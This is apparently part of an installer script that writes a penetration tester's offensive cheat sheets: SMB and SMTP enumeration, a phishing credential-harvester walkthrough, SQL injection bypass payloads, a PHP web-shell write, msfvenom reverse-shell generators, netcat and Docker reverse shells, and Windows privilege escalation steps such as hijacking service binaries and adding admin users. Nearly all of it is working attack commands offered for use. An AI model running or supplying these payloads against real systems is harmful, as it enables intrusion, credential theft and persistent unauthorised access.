==RPCCLIENT - LOOKUP NAME=====================================================
rpcclient -U "" -N target-ip -c "lookupnames administrator"
================================================================================

==RPCCLIENT - LOOKUP SID======================================================
rpcclient -U "" -N target-ip -c "lookupsids S-1-5-21-<DOMAIN-SID>-RID"
================================================================================

==RPCCLIENT - SERVER INFO=====================================================
rpcclient -U "" -N target-ip -c "srvinfo"
================================================================================

==RPCCLIENT - NETSHARE ENUM===================================================
rpcclient -U "" -N target-ip -c "netshareenum"
================================================================================

==RPCCLIENT - PASSWORD POLICY================================================
rpcclient -U "" -N target-ip -c "getdompwinfo"
================================================================================

==RPCCLIENT - LOCAL GROUP ENUM================================================
rpcclient -U "" -N target-ip -c "enumalsgroups domain"
================================================================================

==RPCCLIENT - INTERACTIVE SHELL===============================================
rpcclient -U "" -N target-ip
================================================================================
REFEOF

    cat > "$REFERENCE_DST/setref" << 'REFEOF'
============================================================
#Social Engineering Toolkit
$ ./setoolkit

Select “1. Social-Engineering Attacks” from the main menu.

Select “2. Website Attack Vectors” from the submenu.

Select “3. Credential Harvester Attack Method” from the submenu.

Enter the IP address of your system and the port number that you want to use.

Select the website that you want to create a fake login page.

Enter a name for your fake login page and select a template.

Once you have created your fake login page, you can send it to your victim by email, social media, or other means.

REFEOF

    cat > "$REFERENCE_DST/smtpref" << 'REFEOF'
nc -nv $IP 25

Output:
(UNKNOWN) [192.168.1.23] 25 (smtp) open
220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root <-- This means that user exists with that 252 code!
VRFY this_user_does_not_exist
550 5.1.1 <this_user_does_not_exist>: Recipient address rejected: User unknown in local recipient table
REFEOF

    cat > "$REFERENCE_DST/splunkref" << 'REFEOF'
=================================================================================
====SPLUNK SHELLS
#Download plugin, upload plugin, permit plugin to all.
https://www.n00py.io/2018/10/popping-shells-on-splunk/
https://github.com/TBGSecurity/splunk_shells
#Manage Apps.
#Upload .tar.gz file.
#Restart Splunk.
#Permit App with all.
#msfconsole
use exploit/multi/handler
set PAYLOAD python/shell_reverse_tcp


#Once your MSF handler (or netcat listener) are up and running, you can trigger the app by typing:
|revshell SHELLTYPE <ATTACKERIP> <ATTACKERPORT>
| revshell std 10.10.15.142 9090

$BLING BLING$
=================================================================================
REFEOF

    cat > "$REFERENCE_DST/sqlref.txt" << 'REFEOF'
BEFORE ANYTHING!
STEP 1: FIND THE INJECTION. SERIUSLY. JUST TRY A SINGLE '

STEP 2:
GOT AN ERROR? GOOD. NOW,
YOU ARE WASTING YOUR TIME IF THERE IS ANY FORM OF SQLi FILTERING.

IF YOU are NOT GETTING ERRORS - START MAKING BURP PAYLOADS.
SERIOUSLY.
PROBABLY SQLi FILTERING GOING ON.
==>WE HAVE WAYS TO BYPASS THAT<==
================================================================================
[+ AUTHENTICATION BYPASS]
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
name='wronguser' or 1=1;
name='wronguser' or 1=1 LIMIT 1;
================================================================================
[+ SQL INJECTION REFERENCE]
---===Enumerating the Database===---
comment.php?id=738)'
--------------------------------------------------------------------------------
(Verbose error message?)
?id=738 order by 1
?id=738 union all select 1,2,3,4,5,6
--------------------------------------------------------------------------------
Determine MySQL VERSION:
?id=738 union all select 1,2,3,4,@@version,6

CURRENT USER being used for the database connection:
?id=738 union all select 1,2,3,4,user(),6
--------------------------------------------------------------------------------
[Enumerate Database Tables and column structures]
?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables

[Target the users table in the database]
?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

[Extract the name and password]
?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users
--------------------------------------------------------------------------------

================================================================================
PHP Backdoor with into OUTFILE ''
?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
================================================================================
To avoid repetition, anywhere you see: version()
(Used to to retrieve the database version) you can replace it with:

database() – to retrieve the current database’s name
user() – to retrieve the username that the database runs under
@@hostname – to retrieve the hostname and IP address of the server
@@datadir – to retrieve the location of the database files

VERSION:
SELECT @@version

CURRENT USER:
SELECT user();
SELECT system_user();

LIST USERS:
SELECT user FROM mysql.user;

LIST PASSWORD HASHES:
SELECT host, user, password FROM mysql.user;
================================================================================
BURP BURP BURP BURP BURP BURP BURP BURP BURP BURP BURP BURP BURP BURP BURP BURP
====SQLi Filtered? Bypass Filters.==============================================
SQLi Filtering / Evasion / Bypassing.===========================================
LOOK AT YOUR NOTES. ATTACKS==>"Burp and SQLi Evasion Attack"<=================
https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
https://blog.infogen.al/2016/09/skytower-ctf-walkthrough.html
================================================================================
‘ or 1=1#
‘ or 1=1– –
‘ or 1=1/* (MySQL < 5.1)
' or 1=1;%00
' or 1=1 union select 1,2 as `
' or#newline
1='1
' or– -newline
1='1
' /*!50000or*/1='1
' /*!or*/1='1
--------------------------------------------------------------------------------
Wildcards.
'_'
''
'&'
'^'
'*'
' or''-'
================================================================================
Extra Reference - SQL Default Credentials=======================================
-uroot -proot
-uroot -p
================================================================================
====Jailed TTY? Need to Access MySQL?===========================================

mysql -uroot -proot -e 'show databases;'
<Displays Databases...>

mysql -uroot -proot -e 'use <database_name>; show tables;'
<Displays Tables from selected database.>

fucking do things.
================================================================================

INITIAL PAYLOAD:
' OR email LIKE '%';#

As we see, from the response - SQL filters the 'OR' clause.
This can by bypassed very easily with '||' :)

--------------------------------------------------------------------------------
With the following payload :)
email=' || email LIKE '%';#

BYPASS FILTERING OF 'OR' WITH: '||'
' || email LIKE '%';#
--------------------------------------------------------------------------------

Getting ideas?
' || email LIKE 'a%';#
' || email LIKE 'b%';#
' || email LIKE 'c%';#
I.E.
' || email LIKE '§§%';#
;)
I created /root/AlphaNumeric-Simple.txt for you, Samantha. Have fun ! ^_^
--------------------------------------------------------------------------------
EXTRA GOOD REFERENCE:
https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
GOT ERRORS? GOOD. WHAT WAS FILTERED?
====REPLACE FILTERED OPERATORS WITH===:
-- with #
OR with ||
AND with &&

EXAMPLE:
' or 1=1-- -
Filtered. Shit. Well, Substituted Becomes:
' || 1=1#
==============================================================================
create db..
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '';
CREATE DATABASE name;
============================================================================== 


REFEOF

    cat > "$REFERENCE_DST/sshref.txt" << 'REFEOF'
================================================================================
====Connect Methods=============================================================
================================================================================
ssh user@x.x.x.x
ssh user@x.x.x.x -p <ssh-port>

================================================================================
====Connect & Execute===========================================================
================================================================================
(Nice for breaking out of restricted bash shells)
ssh user@x.x.x.x "/bin/sh"

(Nice for getting a valid TTY - setup a multi/handler as well.)
ssh user@x.x.x.x "/bin/nc 10.0.0.67 443 -e /bin/sh -i"

================================================================================
====Connect to Victim with My Public Key========================================
================================================================================
Victim Machine:
/user/.ssh/authorized_keys

My Machine:
1. ssh-keygen
2. cd /root/
(Permissions)
3. chmod 600 .ssh
4. cd .ssh
5. chmod 400 id_rsa
6. cat id_rsa.pub
(Bypass with ssh-add and confirm with ssh-add -l on local machine)
7. ssh-add
8. ssh-add -l
9. Copy id_rsa.pub key into victim's /user/.ssh/authorized_keys file
10. ssh user@x.x.x.x
================================================================================
====Extra - Tunneling out the Victim's SSH Service!=============================
====Otherwise known as - "HTTP-Tunneling"=======================================
================================================================================
1. proxytunnel -p <TARGET>:<PROXY PORT #> -d 127.0.0.1:22 -a 9997
2. ssh user@127.0.0.1 -p 9997 "/bin/sh"
================================================================================
Hopping around with ssh and id.rsa and chmod and /var/tmp and tunneling so yeah.
As www-data if you have the private ssh key !
$ cd /var/tmp
$ touch id.rsa
$ paste contents
$ chmod 600 id.rsa
$ ssh -i id.rsa p48@172.17.0.1
$ ip addr
    inet 192.168.96.81/24 brd 192.168.96.255 scope global eth0
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
nice.
===============================================================================
Forward out Port (on target machine 127.0.0.1:3306 to 0.0.0.0:1111:)
[Must be root]
ssh -L 0.0.0.0:9997:127.0.0.1:3306 TARGETS_IP

e.g:
ssh -L 0.0.0.0:9997:127.0.0.1:3306 192.168.145.44
===============================================================================
ssh -D localhost:9050 -f -N -i $HOME/offshore/id_rsa root@10.10.110.123
===============================================================================
ssh -L 8080:127.0.0.1:8080 user@chemistry
===============================================================================
#rsa
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
===============================================================================
#Extract victim username
cat ./id_rsa |grep -v '\-\-'|base64 -d |xxd |tail -2
REFEOF

    cat > "$REFERENCE_DST/sstiref" << 'REFEOF'
###SSTI JINA/TWIG PROBE
https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
You can try to probe {{7*'7'}} to see if the target is vulnerable. 
It would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use. 
REFEOF

    cat > "$REFERENCE_DST/swarmref.txt" << 'REFEOF'
=========================================================================
basically:
FROM scratch

ADD rootfs.tar.xz /
COPY ncat /
CMD ["/ncat", "172.17.0.1", "3338", "-e", "/bin/sh"]

# yTu build the docker file from literal scratch, copy a ncat binary over to it, then listen on swarm box to catch shell
# Then, when you run the service:
# Well, first you push that to the registry:

sudo docker build -t swarm.htb:5000/newsbox-web .
sudo docker push swarm.htb:5000/newsbox-web


Then you run, but you specify a mount:
sudo docker service create --mount type=bind,source=/root,target=/somewhere localhost:5000/newsbox-web

# This mounts /root on the box to the docker container, which you can access with your ncat shell. you need to listen on localhost on the box because the docker container cant communicate with your kali box
=========================================================================
REFEOF

    cat > "$REFERENCE_DST/transferRef" << 'REFEOF'
=================================================================================
ZONE TRANSFER:
A successful zone transfer does not directly result in a network breach.
However, it does facilitate the process. The host command syntax for performing a zone
transfer is as follows.

Syntax:
1. host -t NS <domain>
2. host -l <domain_name_in_question> <domain_name_server_to_check>

Could provide me with a full dump of the ZONE FILE, thus IPs and DNS names as
well, for the given domain.


TOOL CREATED: zoneAnalyze.sh
Usage: zoneAnalyze.sh <domain_target> <type_NS_MX>
    * Example: zoneAnalyze.sh megacorpone.com NS
    * --fi

What it does: Go through a for loop, set variable 'server' to return the
results of an ordinary nslookup/host -t NS lookup result. BUT, for each one,
cut out only the nameservers with |cut -d" " -f4 and that will be the result of
the, now, $server variable.

Inside the loop, check against each result of $server (nameserver returns) and
attempt a simple zone transfer against each one.

Output could possibly be a LOT of information - total dump of that domain's
IPs, domain name servers, mail servers...shit tons of stuff if it succeeds.
=================================================================================
REFEOF

    cat > "$REFERENCE_DST/venomref.txt" << 'REFEOF'
[+ WINDOWS ENCODED PAYLOADS ] PORT 443
====CHANGE. IP. AS. NEEDED.====

WINDOWS/SHELL/REVERSE_TCP [PORT 443]
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.49.60 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/SHELL_REVERSE_TCP (NETCAT x86) [PORT 443]
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.60 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/SHELL_REVERSE_TCP (NETCAT x64) [PORT 443]
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.60 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/METERPRETER/REVRESE_TCP (x86) [PORT 443] AT 192.168.49.60:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.60 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/METERPRETER/REVRESE_TCP (x64) [PORT 443] AT 192.168.49.60:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.60 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_64.exe




---===BIND SHELL, ENCODED, ON PORT 1234===---
msfvenom -p windows/shell_bind_tcp LHOST=192.168.49.60 LPORT=1234 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o bindshell_1234_encoded_86.exe

Code for encoding:
--platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload_86.exe

================================================================================
[+ LINUX ]
LINUX/x86/METERPRETER/REVERSE_TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.49.60 LPORT=9997 -f elf >reverse.elf

NETCAT
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.60 LPORT=1234 -f elf >reverse.elf
================================================================================

[+ PHP ]
PHP/METERPRETER_REVERSE_TCP [PORT 443]
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.49.60 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

PHP/METERPRETER/REVERSE_TCP [PORT 443]
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.49.60 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

PHP/REVERSE_PHP [PORT 443]
msfvenom -p php/reverse_php LHOST=192.168.49.60 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
================================================================================

[+ ASP]
ASP-REVERSE-PAYLOAD [PORT 443]
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.60 LPORT=443 -f asp > shell.asp

OR FOR NETCAT [PORT 443]
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.60 LPORT=443 -f asp > shell.asp

================================================================================
[+ Client-Side, Unicode Payload - For use with Internet Explorer and IE]
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none

#Note: To keep things the same size, if needed add NOPs at the end of the payload.
#A Unicode NOP is - %u9090

================================================================================
===SHELLCODE GENERATION:
================================================================================
--===--
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.60 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai
--===--
================================================================================
#DLL
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.49.211 LPORT=6666 -f dll -o tzres.dll
REFEOF

    cat > "$REFERENCE_DST/wFuzzRef" << 'REFEOF'
https://tools.kali.org/web-applications/wfuzz
REFEOF

    cat > "$REFERENCE_DST/wafref" << 'REFEOF'
====Web Access Firewall EVASION=================================================
PAYLOADS

================================================================================
REFEOF

    cat > "$REFERENCE_DST/webref" << 'REFEOF'
Web Application Attack Surface
.
├── Authentication & Session Management
│   ├── Default Credentials
│   ├── Weak Credentials
│   ├── Username Enumeration (Error Messages / Timing)
│   ├── Password Policy Weaknesses
│   ├── Brute Force / Credential Stuffing
│   ├── Authentication Bypass
│   ├── MFA Bypass
│   ├── OAuth / SSO Bypass
│   ├── JWT Attacks (None/Weak Signing, Claim Tampering)
│   ├── Session Fixation
│   ├── Session Hijacking
│   ├── Insecure Logout
│   └── Remember-Me Token Abuse
│
├── Authorization & Access Control
│   ├── IDOR (Insecure Direct Object Reference)
│   ├── Missing Authorization Checks
│   ├── Horizontal Privilege Escalation
│   ├── Vertical Privilege Escalation
│   ├── Forced Browsing
│   ├── Function-Level Authorization Bypass
│   └── Business Logic Authorization Flaws
│
├── Input Validation & Injection
│   ├── SQL Injection
│   │   ├── Error-Based
│   │   ├── Union-Based
│   │   ├── Boolean-Based Blind
│   │   └── Time-Based Blind
│   ├── NoSQL Injection
│   ├── Command Injection
│   ├── OS Injection
│   ├── LDAP Injection
│   ├── XPath Injection
│   ├── Template Injection
│   │   ├── SSTI (Server-Side)
│   │   └── CSTI (Client-Side)
│   ├── Expression Language Injection
│   └── Header Injection
│
├── Cross-Site Attacks
│   ├── Cross-Site Scripting (XSS)
│   │   ├── Reflected
│   │   ├── Stored
│   │   └── DOM-Based
│   ├── Cross-Site Request Forgery (CSRF)
│   ├── Cross-Origin Resource Sharing (CORS) Misconfigurations
│   └── Clickjacking
│
├── File & Path Handling
│   ├── Directory Traversal
│   ├── Arbitrary File Read
│   ├── Arbitrary File Write
│   ├── Local File Inclusion (LFI)
│   ├── Remote File Inclusion (RFI)
│   ├── File Upload Vulnerabilities
│   │   ├── Unrestricted File Upload
│   │   ├── File Extension Whitelist Bypass
│   │   ├── MIME Type Bypass
│   │   ├── Content Validation Bypass
│   │   ├── File Size Limit Bypass
│   │   ├── Path Traversal via Upload
│   │   ├── File Overwrite
│   │   └── Unexpected File Storage Locations
│   └── php://filter / wrapper abuse (where applicable)
│
├── Server-Side Attacks
│   ├── Server-Side Request Forgery (SSRF)
│   │   ├── Internal Network Access
│   │   ├── Cloud Metadata Access
│   │   └── Protocol Smuggling
│   ├── XML External Entity (XXE)
│   ├── Deserialization Vulnerabilities
│   ├── Template Engine Abuse
│   └── Log Poisoning
│
├── API-Specific Attacks
│   ├── Unauthenticated API Access
│   ├── Excessive Data Exposure
│   ├── Mass Assignment
│   ├── Improper HTTP Method Handling
│   ├── Missing Rate Limiting
│   ├── Broken Object Level Authorization (BOLA)
│   ├── Broken Function Level Authorization (BFLA)
│   └── GraphQL-Specific Attacks
│
├── Information Disclosure
│   ├── Verbose Error Messages
│   ├── Stack Traces
│   ├── Debug Endpoints
│   ├── Configuration Files
│   ├── Backup Files
│   ├── Temporary Files
│   ├── Metadata Exposure
│   └── Header Disclosure
│
├── Content & Resource Discovery
│   ├── Hidden Directories
│   ├── Hidden Files
│   ├── robots.txt Misuse
│   ├── Forgotten Endpoints
│   ├── Admin Panels
│   ├── API Endpoints
│   └── Legacy Functionality
│
├── Source Code & Repository Exposure
│   ├── Exposed Version Control Systems
│   │   ├── .git
│   │   ├── .svn
│   │   ├── .hg
│   │   └── .bzr
│   ├── Client-Side Source Code Review
│   └── Hardcoded Secrets
│
├── Web Server & Platform Misconfigurations
│   ├── Insecure HTTP Methods
│   ├── WebDAV Enabled
│   ├── Default Pages
│   ├── Insecure TLS Configuration
│   ├── Missing Security Headers
│   └── Virtual Host Misconfiguration
│
├── Business Logic Flaws
│   ├── Workflow Bypass
│   ├── Race Conditions
│   ├── Price / Quantity Manipulation
│   ├── Coupon / Discount Abuse
│   ├── Account Takeover Logic
│   └── Trust Boundary Violations
│
└── Code Review & Architecture
    ├── Manual Source Code Review
    ├── Insecure Cryptographic Usage
    ├── Hardcoded Secrets
    ├── Improper Error Handling
    └── Trust Boundary Violations
REFEOF

    cat > "$REFERENCE_DST/windowsPrivEsc.txt" << 'REFEOF'
================================================================================
METERPRETER. TRANSFER. FAST. PORTFWD. FAST. PSEXEC. FAST.
================================================================================
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.11.0.211
set LPORT 443
================================================================================


WINDOWS SYSTEM INFORMATION
systeminfo

================================================================================
[+ PROXYCHAINS INTO WINDOWS REMOTE DESKTOP]
proxychains rdesktop -g 80% -u <user> -p <password> -d <domain> <IP>
ASK: "Is the user part of the local Admin users?"
net user <username>
================================================================================
[PART 1]
# BASICS
================================================================================
systeminfo
hostname

# WHO AM I?
whoami
echo %username%

# WHAT USERS/LOCALGROUPS ARE ON THIS MACHINE?
net users
net localgroups

# CHECK TO SEE IF THE USER AS PRIVILEGES
net user user1

# VIEW DOMAIN GROUPS
net group /domain

# VIEW MEMBERS OF DOMAIN GROUPS
net group /domain <Group Name>

# FIREWALL
netsh firewall show state
netsh firewall show config

# NETWORK
ipconfig /all
route print
arp -A

# HOW WELL PATCHED IS THIS SYSTEM?
wmic qfe get Caption,Description,HotFixID,InstalledOn
================================================================================
[+ PART 2]
====CLEARTEXT PASSWORDS IN FILES====
================================================================================
CLEARTEXT PASSWORDS. SEARCH FOR THEM.
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#FIND ALL THOSE STRINGS IN CONFIG FILES
dir /s *pass* == *cred* == *vnc* == *.config*

# FIND ALL PASSWORDS IN ALL FILES
findstr /spin "password" *.*
findstr /spin "password" *.*

====CLEARTEXT PASSWORDS IN REGISTRY====
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# WINDOWS AUTOLOGIN
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP PARAMETERS
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# PUTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# SEARCH FOR CLEARTEXT PASSWORDS IN REGISTRY
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s


================================================================================
[+ PART 3]
====SERVICES AND PORT FORWARDING====
================================================================================
netstat -ano

Local address 0.0.0.0
Local address 0.0.0.0 means that the service is listening on all interfaces.
This means that it can receive a connection from the network card, from the
loopback interface or any other interface. This means that anyone can connect to it.

Local address 127.0.0.1
Local address 127.0.0.1 means that the service is only listening for connection
from the your PC. Not from the internet or anywhere else.
This is interesting to us!

Local address 192.168.1.9
Local address 192.168.1.9 means that the service is only listening for connections
from the local network. So someone in the local network can connect to it, but
not someone from the internet. This is also interesting to us!

====FORWARD OUT A SERVICE====
# Port forward using plink
plink.exe -l root -pw mysecretpassword <MYIP> -R 8080:127.0.0.1:8080

#PORT FORWARD USING METERPRETER
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.1.101

================================================================================
[+ PART 5]
====SCHEDULED TASKS====
================================================================================
Here we are looking for tasks that are run by a privileged user, and run a binary
that we can overwrite.
schtasks /query /fo LIST /v

Yeah I know this ain't pretty, but it works. You can of course change the name
SYSTEM to another privileged user. In other words, copy the output into Kali and
just grep for SYSTEM. lol... nice.
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

====CHANGE THE UPNP SERVICE BINARY====
sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""

================================================================================
[+ PART 6]
====WEAK. SERVICE. PERMISSIONS.====
================================================================================

Services on windows are programs that run in the background. Without a GUI.

IF YOU FIND A SERVICE THAT HAS WRITE PERMISSIONS set to "EVERYONE", you can change
that binary INTO YOUR OWN CUSTOM BINARY and make it execute in the privileged context.

First we need to find services. That can be done using wmci or sc.exe. Wmci is
not available on all windows machines, and it might not be available to your user.

If you don't have access to it, you can use sc.exe.

====WEAK. SERVICE. PERMISSIONS. CONTINUED====
====WITH WMCI====
wmic service list brief

This will produce a lot out output and we need to know which one of all of these
services have weak permissions. IN ORDER TO CHCEK THAT, we can use the icacls program.

Notice that icacls is only available from Vista and up. XP and lower has cacls instead.

As you can see in the command below you need to make sure that you have access to
wimc, icacls and write privilege in C:\windows\temp.
--------------------------------------------------------------------------------
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

ICACLS
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
CACLS
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c cacls "%a"
--------------------------------------------------------------------------------
====SC.EXE====
--------------------------------------------------------------------------------
sc query state= all | findstr "SERVICE_NAME:" >> ServiceNames.txt

FOR /F %i in (ServiceNames.txt) DO echo %i
type ServiceNames.txt

FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i >> Services.txt

FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
--------------------------------------------------------------------------------
NOW YOU CAN PROCESS THEM ONE BY ONE WITH THE CALCS COMMAND.
cacls "C:\path\to\file.exe"
--------------------------------------------------------------------------------
================================================================================
EXAMPLE:
C:\path\to\file.exe
BUILTIN\Users:F
BUILTIN\Power Users:C
BUILTIN\Administrators:F
NT AUTHORITY\SYSTEM:F

That means your user has write access. So you can JUST RENAME the .exe file and
then ADD YOUR OWN MALICIOUS binary. And then RESTART THE PROGRAM and your binary
will be executed instead.

This can be a simple getsuid program or a reverse shell that you create with msfvenom.
Here is a POC code for getsuid:
--------------------------------------------------------------------------------
#include <stdlib.h>
int main ()
{
int i;
    i = system("net localgroup administrators theusername /add");
return 0;
}
--------------------------------------------------------------------------------
AND THEN COMPILE IT WITH THIS:
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
--------------------------------------------------------------------------------
====NOW, RESTART THE SERVICE. WITH EITHER WMIC OR NET====
RESTART THE SERVICE WITH WMIC:

wmic service NAMEOFSERVICE call startservice

RESTART THE SERVICE WITH NET:
net stop [service name] && net start [service name].


....
The binary should now be executed in the SYSTEM or Administrator context.


================================================================================
[+ PART 7] UNQUOTED SERVICE PATHS. LOOK FOR EM.
================================================================================
USING WMIC:
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

USING SC:
sc query
sc qc service name

WHAT AM I LOOKING FOR HERE?
IF THE PATH CONTAINS ONLY "" AND SPACES - WELL...IT'S VULNERABLE.

HAVE A HIT?
icacls "C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"

EXPLOIT IT.

IF THE PATH TO THE BINARY IS THIS:
C:\Program Files\something\winamp.exe

CHANGE IT TO DUH:
C:\WHOA_A_PAYLOAD.EXE

DO THAT WITH SC COMMANDS ABOVE (OR BELOW WITH BOB) AS REFERENCE.

WELL THAT WAS FUN. ALMOST DONE.

================================================================================
[ON WINDOWS XP AND OLDER WE CAN GET AN ADMINISTRATIVE COMMAND PROMPT]
================================================================================
IF you have a GUI with a USER THAT IS INCLUDED IN THE Administrators GROUP you first
need to open up cmd.exe for the administrator. If you open up the cmd that is in
Accessories it will be opened up as a normal user. And if you rightclick and do
Run as Administrator you might need to know the Administrators password. Which
you might not know. So instead you open up the cmd from c:\windows\system32\cmd.exe.
This will give you a cmd with Administrators rights.

From here we want to become SYSTEM user. To do this we run:
First we check what time it is on the local machine:

time

# Now we set the time we want the system CMD to start.
# Probably one minuter after the time.
at 01:23 /interactive cmd.exe

BOOM SYSTEM.
================================================================================
[ON VISTA AND NEWER] THIS IS NICE.
You first need to upload PsExec.exe and then you run:
psexec -i -s cmd.exe

BOOM SYSTEM.



THAT WAS FUN.


================================================================================
# RDP
# Add yourself and start RDP

net user siren somepass /add
net localgroup administrators siren /add 
net localgroup "Remote Desktop Users" siren /add 

#Execute Second
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
sc config TermService start= auto
#IF POWERSHELL
sc.exe config TermService start= auto
sc start TermService
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall add rule name="Allow RDP 3389" protocol=TCP dir=in localport=3389 action=allow
netstat -an | find "3389"
xfreerdp /u:siren /p:somepass /v:10.65.1.40:3389 /cert:ignore /timeout:60000

#If needed:
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set opmode disable
net start TermService
================================================================================
[ Stuff Done in the Past ] SERVICE PATH CHANGING AS DONE WITH BOB.
sc config UPNPHOST binpath= "C:\inetpub\siren\sirenInc.exe"
sc config UPNPHOST obj= ".\LocalSystem" password= ""
sc config SSDPSRV binpath= "C:\inetpub\siren\sirenInc.exe"
sc config SSDPSRV obj= ".\LocalSystem" password= ""
sc config SSDPSRV start= "demand"
[*] Stage Payload Listener in Meterpreter
net start SSDPSRV
================================================================================
--==DO THIS FIRST, CHECK FOR WEAK SERVICE PERMISSIONS. EACH LINE INTO path.txt==--
sc query state= all | findstr "SERVICE_NAME:" >> ServiceNames.txt
FOR /F %i in (ServiceNames.txt) DO echo %i

type ServiceNames.txt
FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i >> Services.txt

3.
FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
================================================================================
[+ Accesschk]
